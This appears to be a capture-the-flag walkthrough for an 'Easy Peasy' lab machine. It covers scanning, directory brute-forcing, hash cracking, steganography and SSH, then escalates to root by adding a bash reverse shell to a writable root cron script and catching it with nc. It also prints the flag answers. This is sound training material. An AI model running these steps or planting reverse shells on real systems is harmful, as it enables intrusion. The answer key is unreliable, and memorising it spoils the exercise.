1 question 

nmap -A -p- <ip address>

2 question 

The answer is on the nmap scan 

3 question 

The answer is also on the nmap scan 


4 question 

gobuster dir -u http://<ip address> -w <wordlist of your choice>
you will get a output called hidden 
on the url http://<ip adddress/hidden/whatever
you ctrl+u to see the page source 
you will see a hash
you can use this command to decode it echo "<the string>" | base64 -d on our terminal 

5 question 

curl -s http://<ip address>/robots.txt 
you will see a hash
you can use a online hash cracker to crack the hash 

6 question 

curl -s http://<ip address>:65524/ | grep flag

7 question 

curl -s http://<ip address>:65524/ | grep hidden 
you will get a base 62 hash 
you can use a online hash cracker to crack the hash 

8 question 

curl -s http://<ip address>/n0th1ng3ls3m4tt3r/
you have to use their wordlist to crack it I decided to use john the ripper 
john --wordlist=easypeasy.txt --format=GOST <file that have your hash> (The command for jtr)

9 question 

You can download the photo 
we can use the command called steghide 
setghide --extract -sf <file name>
cat secrettext.txt 
you can use cyberchef to decode the binary 

10 question 

ssh boring@<ip address> -p6498
ls -la
cat user.txt 
synt{a0jvgf33zfa0ez4y} this is encoded in ROT10
we can use an online ROT10 cracker to do it 

11 question 

cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
The file is owned by our user, we can modify it.

boring@kral4-PC:~$ ls -l /var/www/.mysecretcronjob.sh 
-rwxr-xr-x 1 boring boring 33 Jun 14 22:43 /var/www/.mysecretcronjob.sh
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root
Let’s edit the script with nano (vim is not installed on the target), and add a reverse shell:

boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh 
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
#!/bin/bash
# i will run as root
bash -i >& /dev/tcp/<this will be ip address that is given to you by the vpn/4444 0>&1

kali@kali:/data/Easy_Peasy/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.105.32] 55704
bash: cannot set terminal process group (1741): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# whoami
whoami
root
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ll
ll
total 40
drwx------  5 root root 4096 Jun 15 12:40 ./
drwxr-xr-x 23 root root 4096 Jun 15 01:08 ../
-rw-------  1 root root    2 Aug 24 02:47 .bash_history
-rw-r--r--  1 root root 3136 Jun 15 12:40 .bashrc
drwx------  2 root root 4096 Jun 13 15:40 .cache/
drwx------  3 root root 4096 Jun 13 15:40 .gnupg/
drwxr-xr-x  3 root root 4096 Jun 13 15:44 .local/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15 01:01 .root.txt
-rw-r--r--  1 root root   66 Jun 14 21:48 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
Answer: flag{63a9f0ea7bb98050796b649e85481845}
